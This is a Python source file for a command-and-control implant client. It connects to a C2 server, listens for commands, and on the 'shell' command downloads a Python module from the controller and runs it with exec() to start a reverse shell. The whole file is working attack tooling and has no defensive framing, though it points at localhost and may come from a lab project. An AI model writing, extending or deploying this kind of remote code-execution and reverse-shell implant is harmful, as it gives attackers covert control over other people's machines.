import socket,threading

from urllib import request

import threading

def make_threaded(func):
    
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread 
    return wrapper



class client():

    def __init__(self, host, port):
        self.host = host
        self.host_port = port
        self.connection = self.connect()

    #create a connection to C2 server
    def connect(self):
        print("creating connection")
        connection = socket.create_connection((self.host,self.host_port))
        data = connection.recv(1)
        if str(data.decode()) == 'g':
            print("connection established")
            connection.send('g'.encode())
        
        return connection
    
    @make_threaded
    def run_module(self,name):
        url = f"http://{self.host}:5001/{name}.py"
        module = request.urlopen(url).read().decode('utf-8') 
        exec(module)
        return


    #listen for commands
    def run(self):
         while True:
            try:
                instruction = self.connection.recv(1024).decode()
                if not instruction:
                    break
                if instruction == 'shell':
                    print("starting  reverse shell")
                    self.run_module('tcp_shell')

            except Exception as e:
                self.connection.sendall(str(e).encode()) 
        
            
            
c = client('localhost', 5000)
c.run()
   